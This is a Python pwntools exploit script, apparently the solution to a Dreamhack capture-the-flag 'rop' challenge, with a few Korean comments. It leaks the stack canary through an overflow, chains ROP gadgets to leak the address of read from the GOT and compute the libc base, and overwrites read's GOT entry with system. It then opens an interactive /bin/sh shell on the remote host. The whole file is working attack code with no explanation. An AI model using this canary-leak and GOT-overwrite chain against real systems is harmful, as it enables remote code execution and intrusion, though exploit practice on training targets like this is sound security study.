from pwn import *

#host8.dreamhack.games 11066
def slog(name, addr) : return success(':'.join([name,hex(addr)]))
p = remote("host8.dreamhack.games", 11066)
e = ELF("./rop")

context.log_level="debug"


libc = ELF("./libc.so.6")
read_system = libc.symbols["read"] - libc.symbols["system"]


buf = b'A'*0x39
p.sendafter(b'Buf: ',buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog('canary',canary)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_15 = 0x0000000000400851
ret = 0x0000000000400596

payload = b'A' * 0x38 + p64(canary) + b'B' *0x8

#write(1,read_got,...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_15) + p64(read_got) + p64(0)
payload += p64(write_plt)

#read(0, read_got,000)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_15) + p64(read_got) + p64(0)
payload += p64(read_plt)

#read("/bin/sh") == system("bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ',payload)

#read got 주소 
read = u64(p.recvn(6)+b'\x00'*2)
p.recvn(0x100 - 6)

lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

slog('read',read)
slog('libc_base',lb)
slog('system',system)

payload_overwrite = p64(system) + b'/bin/sh\x00'
payload_overwrite += b'A' * (0x100 - len(payload_overwrite)) # 256바이트 채우기
p.send(payload_overwrite)

p.interactive()

